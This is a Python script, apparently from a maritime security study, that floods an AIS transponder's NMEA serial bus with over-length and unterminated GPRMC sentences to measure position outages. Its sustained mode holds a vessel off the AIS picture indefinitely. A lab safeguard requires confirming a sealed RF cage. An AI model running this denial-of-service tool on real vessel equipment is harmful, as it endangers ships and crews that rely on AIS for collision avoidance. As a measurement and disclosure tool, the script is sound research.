#!/usr/bin/env python3
r"""
serial_dos_sweep.py -- focused, chart-grade denial-of-service sweep for the AIS serial
(NMEA 0183 / IEC 61162-1) sensor bus. This is the DEPTH tool behind the paper's headline DoS
finding; the broad CVE suite (serial_cve_suite.py) already proves the effect exists, this one
measures it densely enough to plot.

WHAT IT MEASURES
  A continuous valid GPS baseline (BASE, reported with SOG=12 so the unit transmits at the fast
  ~2 s rate) flows the whole time. Against it we inject a single OVER-LENGTH GPRMC of N characters.
  Writing N chars at the sensor baud takes  tx = N*10/baud  seconds (8N1 = 10 bits/char), during
  which the bus is monopolized and the transponder is starved of position. Two attacker-relevant
  numbers come out of each probe:

    OUTAGE        longest stretch with no valid own position report (the vessel is off the picture)
    REACQUISITION time from the end of the malformed write until the FIRST valid report returns
                  (the recovery penalty -- fix re-lock / buffer drain AFTER the line is free)

  The scientific question the chart answers is not "how long is a 16k sentence" (that is just
  tx = N*10/baud, arithmetic) but whether OUTAGE exceeds tx. Outage == tx is pure line occupancy;
  outage >  tx is a processing/recovery penalty -- the parser hurting itself. We sweep N to find
  the KNEE: the length past which a unit stops bounding the input and the outage takes off.

MODES
  sweep      (default) each length injected --repeats times, with full baseline recovery between,
             so we get a median + spread per length -> a clean curve with error bars.
  --sustained SECONDS   one length streamed back-to-back with NO recovery gap, to show the vessel
             can be held dark for as long as the attacker keeps typing (weaponization panel):
             "a single message = one outage" becomes "a 4800-baud stream = indefinite silence".

** SAFETY ** the unit may emit a (stale/no-fix) position over VHF while starved -> cage sealed only.
Live run needs pyserial; --dry-run needs nothing. The RF analog of this bounds weakness is NOT a
length sweep (AIS RF frames are slot-bounded, they cannot carry 16k chars); it is tested by the
oversized / multi-slot / truncated frames in rf_session.py -- see the note printed at the end.
"""
import argparse, json, os, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from serial_cve_suite import gga, rmc, sent, overlen_rmc, baseline_batch, BASE  # reuse builders

try:
    import serial
except Exception:
    serial = None


def hold_baseline(ser, seconds, cadence=1.0):
    """Stream the valid baseline for `seconds`. Returns immediately in dry-run (ser is None)."""
    if ser is None:
        return
    end = time.time() + seconds
    while time.time() < end:
        for s in baseline_batch():
            try: ser.write(s.encode())
            except Exception: pass
        try: ser.flush()
        except Exception: pass
        time.sleep(cadence)


def default_lengths():
    # dense, log-spaced so the curve is smooth and the knee is resolvable; all include $..*cc.
    # The high tail (>=32k) lands on power-of-two BUFFER boundaries where overflow/wraparound/hang
    # behaviour is most likely -- past those you mostly get linear occupancy again.
    return [82, 100, 128, 160, 200, 256, 320, 400, 512, 640, 800, 1024,
            1536, 2048, 3072, 4096, 6144, 8192, 12288, 16384,
            32768, 65536, 131072]


def overlen_unterminated(total_chars):
    """Same over-length GPRMC but with NO <CR><LF> terminator: the parser waits for an end that
    never comes, exposing timeout / buffer-full / hang handling -- the strongest recovery-forcing
    probe (a well-terminated sentence has a clean end the parser can act on)."""
    return overlen_rmc(total_chars).rstrip(b"\r\n")


def main():
    ap = argparse.ArgumentParser(description="Serial over-length DoS sweep (outage + reacquisition, chart-grade).")
    ap.add_argument("--gps-port")
    ap.add_argument("--gps-baud", type=int, default=4800, help="sensor-bus baud (8N1 -> chars/s = baud/10)")
    ap.add_argument("--lengths", type=int, nargs="+", default=default_lengths(),
                    help="sentence lengths (chars incl. $ and *cc) to sweep")
    ap.add_argument("--repeats", type=int, default=3, help="injections per length (median + spread)")
    ap.add_argument("--tail-threshold", type=int, default=16384,
                    help="lengths above this use --tail-repeats (huge probes are slow at low baud)")
    ap.add_argument("--tail-repeats", type=int, default=1,
                    help="repeats for lengths above --tail-threshold (default 1: one long probe each)")
    ap.add_argument("--unterminated", action="store_true",
                    help="also inject a NO-terminator variant at --unterminated-lengths (strongest "
                         "recovery/hang test)")
    ap.add_argument("--unterminated-lengths", type=int, nargs="+",
                    default=[2048, 16384, 65536],
                    help="lengths at which to add an unterminated variant")
    ap.add_argument("--settle", type=float, default=90.0, help="initial baseline settle before the sweep")
    ap.add_argument("--reacq", type=float, default=30.0,
                    help="recovery headroom ADDED on top of each probe's write time, so reacquisition "
                         "always completes inside the window and never bleeds into the next probe")
    ap.add_argument("--min-gap", type=float, default=20.0, help="floor on the recovery hold per probe")
    ap.add_argument("--sustained", type=float, default=0.0,
                    help="if >0: after the sweep, stream one length back-to-back for this many seconds "
                         "(indefinite-hold demonstration) instead of single writes")
    ap.add_argument("--sustained-len", type=int, default=4096, help="length used in --sustained mode")
    ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--i-confirm-cage-sealed", action="store_true")
    args = ap.parse_args()

    cps = args.gps_baud / 10.0
    # plan entries: (nominal_len, repeat_index, kind)  kind in {"sweep","unterm"}
    plan = []
    for n in args.lengths:
        reps = args.tail_repeats if n > args.tail_threshold else args.repeats
        for r in range(reps):
            plan.append((n, r, "sweep"))
    if args.unterminated:
        for n in args.unterminated_lengths:
            reps = args.tail_repeats if n > args.tail_threshold else args.repeats
            for r in range(reps):
                plan.append((n, r, "unterm"))

    def gen_for(n, kind):
        return overlen_unterminated(n) if kind == "unterm" else overlen_rmc(n)

    if args.dry_run:
        nunterm = sum(1 for _, _, k in plan if k == "unterm")
        print(f"baud {args.gps_baud} -> {cps:.0f} chars/s.  {len(plan)} probes "
              f"({len(plan)-nunterm} sweep + {nunterm} unterminated)")
        print(f"{'len':>7} {'kind':>7} {'tx_pred':>9}  sample (first 60 chars)")
        seen = set()
        for n, r, kind in plan:
            if (n, kind) in seen: continue
            seen.add((n, kind))
            raw = gen_for(n, kind)
            print(f"{len(raw):>7} {kind:>7} {len(raw)/cps:>8.2f}s  {raw[:60].decode('latin-1')}")
        per = sum(len(gen_for(n, k)) / cps + max(args.min_gap, len(gen_for(n, k)) / cps + args.reacq)
                  for n, r, k in plan)
        tail = f" (+ {args.sustained/60:.1f} min sustained)" if args.sustained else ""
        print(f"\nestimated wall-clock ~ {(args.settle + per)/60:.1f} min{tail}")
        big = [n for n, _, _ in plan if n > args.tail_threshold]
        if big:
            print(f"NOTE: {len(set(big))} tail lengths > {args.tail_threshold} at {args.tail_repeats} rep(s) "
                  f"each; largest single probe = {max(big)/cps:.0f}s on the wire.")
        if args.sustained:
            print(f"sustained: len {args.sustained_len} streamed for {args.sustained:.0f}s "
                  f"(~{args.sustained*cps/(args.sustained_len+2):.0f} back-to-back writes)")
        return

    if serial is None:
        print("needs pyserial: pip install pyserial --break-system-packages"); sys.exit(1)
    if not args.i_confirm_cage_sealed:
        if input("Type EXACTLY 'cage is sealed' to run: ").strip() != "cage is sealed":
            print("Aborted."); sys.exit(0)

    os.makedirs(args.logdir, exist_ok=True)
    stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    manifest = os.path.join(args.logdir, f"serialdos_{stamp}.jsonl")
    mf = open(manifest, "a", buffering=1)
    def rec(**kw): mf.write(json.dumps({"t": time.time(),
                    "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), **kw}) + "\n")

    ser = serial.Serial(args.gps_port, args.gps_baud, timeout=1)
    rec(event="session_start", base_lat=BASE[0], base_lon=BASE[1], gps_baud=args.gps_baud,
        mode="sweep", lengths=args.lengths, repeats=args.repeats)
    print(f"baseline @ {BASE}; baud {args.gps_baud} ({cps:.0f} cps); settling {args.settle}s ...")
    hold_baseline(ser, args.settle)
    rec(event="baseline", name="settle_done"); hold_baseline(ser, 3)

    try:
        for i, (n, r, kind) in enumerate(plan):
            raw = gen_for(n, kind); pred = len(raw) / cps
            pid = f"dos_{n}_{r}" + ("" if kind == "sweep" else f"_{kind}")
            rec(event="probe_start", id=pid, length=len(raw), nominal=n,
                repeat=r, predicted_s=round(pred, 3), kind=kind)
            print(f"[{i+1}/{len(plan)}] len={len(raw)} kind={kind} rep={r} tx_pred={pred:.1f}s")
            ser.write(raw); ser.flush()
            rec(event="probe_end", id=pid, write_s=round(pred, 3))
            hold_baseline(ser, max(args.min_gap, pred + args.reacq))

        if args.sustained > 0:
            raw = overlen_rmc(args.sustained_len); pred = len(raw) / cps
            rec(event="sustained_start", length=len(raw), nominal=args.sustained_len,
                target_s=args.sustained, predicted_s=round(pred, 3))
            print(f"\nSUSTAINED: streaming len {len(raw)} back-to-back for {args.sustained:.0f}s ...")
            end = time.time() + args.sustained; writes = 0
            while time.time() < end:
                ser.write(raw); ser.flush(); writes += 1
            rec(event="sustained_end", writes=writes, elapsed=round(time.time() - (end - args.sustained), 2))
            print(f"  {writes} back-to-back writes; now recovering ...")
            hold_baseline(ser, max(args.min_gap, pred + args.reacq))
    except KeyboardInterrupt:
        print("\ninterrupted."); rec(event="interrupted")
    finally:
        hold_baseline(ser, 3); ser.close(); rec(event="session_end"); mf.close()

    print(f"\ndone. manifest: {manifest}")
    print("analyze: python3 analyze_dos.py <manifest> <unit_serial_out.nmea> [vhf.nmea] --csv dos.csv")
    print("RF analog of the bounds weakness is slot-bounded (no length sweep possible over AIS RF); "
          "test it with the oversized/multi-slot/truncated frames in rf_session.py.")


if __name__ == "__main__":
    main()
